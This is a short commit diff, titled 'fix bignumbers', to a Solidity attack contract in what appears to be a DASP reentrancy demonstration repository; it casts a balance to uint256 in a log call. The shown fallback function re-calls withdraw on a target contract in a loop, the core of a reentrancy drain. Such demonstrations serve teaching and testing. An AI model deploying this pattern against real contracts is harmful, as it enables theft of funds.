fix bignumbers

+++ dasp/1-reentrancy/contracts/AttackTransferEth.sol
@@ -17,7 +17,7 @@ contract AttackTransferEth {
 
     function () public payable{
         i++;
-        LogAttack(i, this.balance);
+        LogAttack(i, uint256(this.balance));
         if (i < count) teth.withdraw(value);
 
     }
